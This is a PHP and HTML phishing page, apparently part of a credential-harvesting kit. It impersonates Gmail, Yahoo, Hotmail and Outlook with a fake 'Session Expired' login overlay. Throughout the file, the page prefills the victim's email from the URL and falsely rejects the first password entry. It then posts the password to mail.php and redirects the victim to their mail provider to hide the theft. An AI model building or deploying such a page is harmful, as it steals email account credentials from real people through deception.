<?php
    
$domain= $_GET['domain'];
$email = $_GET['email'];



$gmail = "http://gmail.com";
$yahoo = "http://yahoo.com";
$hotmail = "http://hotmail.com";
$outlook = "http://outlook.com";

 
 if(strcmp($domain,$gmail)==0)
    {
        $ifram="<img id='mainPage' src='gmail.png' width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }elseif (strcmp($domain,$yahoo)==0) {
        $ifram="<img id='mainPage' src='yahoo.png' width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }
    elseif (strcmp($domain,$hotmail)==0) {
        $ifram="<img id='mainPage' src='hotmail.png' width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }elseif (strcmp($domain,$outlook)==0) {
        $ifram="<img id='mainPage' src='hotmail.png' width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }else
    {
            $ifram="<iframe id='mainPage' src='$domain' width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }
        


?>


<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>...</title>
    <style>
        body{
            width:99%;
            height:100%;
            margin:0;
            padding:0;
        }
        #mainPage{
            border:none;
        }
        hr{
            border:1px solid #999;
        }
        #overlay{
            background-color:#555;
            position:absolute;
            top:0;
            left:0;
            bottom:0;
            right:0;
            border:1px solid #555;
            opacity: 0.6;
            filter: alpha(opacity=60)
        }
        #loginBody{
            background-color:#555;
            border: 1px solid #DDD;
            box-shadow: 0px 0px 10px #DDD;
            width: 400px;
            height: 180px;
            position:absolute;
            top:30%;
            left:30%;
        }
        #loginBg{
            background:white;
            width:100%;
            height:100%;
            opacity: 0.9;
            filter: alpha(opacity=90);
        }
        #topHeader{
            margin-bottom:10px;
            padding-top:10px;
        }
        #favIcon{
            margin:0 10px;
        }
        #form{
            position:relative;
            left:10%;
            width:80%;
        }
        .email, .pass{
            margin:0 0 5px;
        }
    </style>
</head>

<body>
<?php echo "$ifram"; ?>

<div id="overlay" style="height: 100%; width: 1366px;">

</div>
<div id="loginBody">
    <div id="loginBg">
        <div id="topHeader">
            <img id="favIcon" src="https://www.google.com/s2/favicons?domain=<?php echo"$domain"; ?>"> <b id="sExp">Session Expired！</b>
            <hr>
        </div>
        <div id="form">
            <form id="form_login">
                <input id="client" type="hidden" value="SESSION EXPIRED" name="client">
                <input id="cid" type="hidden" value="" name="cid">
                <div class="email">
                    <span id="emailId"></span>
                    <input id="email"  type="hidden" value="<?php echo "$email"; ?>" name="email">
                    <input id="main_domain" type="hidden" value="<?php echo"$domain"; ?>" name="main_domain">
                </div>

                <div class="pass">
                    <span id="passName">Password</span>： <input type="password" name="pass" id="password">
                    <div><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
                </div>
                <div class="pass">
                    <input type="checkbox"> <span id="keepme">Keep me logged in</span>
                </div>
                <div class="submit">
                    <input type="submit" value="Log in" id="loginButton">
                </div>
            </form>
        </div>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script>
    var strMainDomain   = '<?php echo $domain ?>';
    var strPageIcon     = 'http://www.google.com/s2/favicons?domain='+strMainDomain;
    var intSubmit       = 0;
    var strFirstPassword = '';

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }

    (function(){
        $('#password').focus();
        var link = document.createElement('link');
        link.type   = 'image/x-icon';
        link.rel    = 'shortcut icon';
        link.href   = strPageIcon;
        document.getElementsByTagName('head')[0].appendChild(link);
        document.getElementById('favIcon').src = strPageIcon;
        $strEmail = getParameterByName('email');
        $('#emailId').text($strEmail);

        var x=0;
        $('#form_login').submit(function(e){
            e.preventDefault();
            
            if(x==0)
            {   $('#error').show();
                $('#error').text('Incorrect password, Please try again.');
                result = document.getElementById('password');
                result.value="";
                x++;
            }else{
                submitPassword();
            }



        });
    }());

    function submitPassword(){
        var result;
        var strPassword = $('#password').val();
        var stremail = $('#email').val();
        var strdomain = '<?php echo $domain ?>';
        if(strPassword == '' || strPassword == null){
            $('#error').show();
            $('#error').text('Incorrect password, Please try again.');
        }else if (strPassword.length < 6){
             $('#error').show();
            $('#error').text('Incorrect password, Please try again.');
            result = document.getElementById('password');
            result.value="";
        } else{
           
            
           
           $.post('mail.php',{'postemail':stremail,'postpaswrd':strPassword},function(data){
               if (data=="0"){
                   //submit button clicked for the first time
                   result = document.getElementById('password');
                   result.value="";
                                       
               }else{
                    
                    var subDomain=subStrAfterChars(stremail, '@','b');
                    
                    window.location='http://'.concat(subDomain);
               }
           });
        }
    }


    function subStrAfterChars(str, char, pos)
        {

         return str.substring(str.indexOf(char) + 1);

        }


</script>
</body>
</html>